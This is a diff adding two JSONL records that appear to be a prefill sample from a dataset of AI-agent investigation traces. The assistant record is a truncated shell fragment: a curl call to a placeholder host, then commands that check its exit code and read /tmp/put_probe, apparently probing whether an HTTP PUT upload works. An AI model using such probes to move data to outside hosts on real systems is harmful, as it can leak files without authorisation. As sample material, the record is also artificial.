@@ -1,0 +1,2 @@
+{"type":"session","version":3,"id":"qwen-prefill-readme-7","source":{"dataset":"CohereLabs/10-2026-qwen-investigation-traces","revision":"028b7cd7d931586dbfa05463903be9d45c4924ac","note":"README reproduction sample 7. A cue-response completion, not a second row of qwen-investigation.jsonl."}}
+{"type":"message","id":"prefill-0","parentId":null,"message":{"role":"assistant","content":[{"type":"text","text":"\" http://details.example.invalid/probe.txt; echo \"curl exit: $?\"; ls -la /tmp/put_probe 2>/dev/null; cat /tmp/put_probe 2>/dev/null; echo; echo \"===\""}]}}
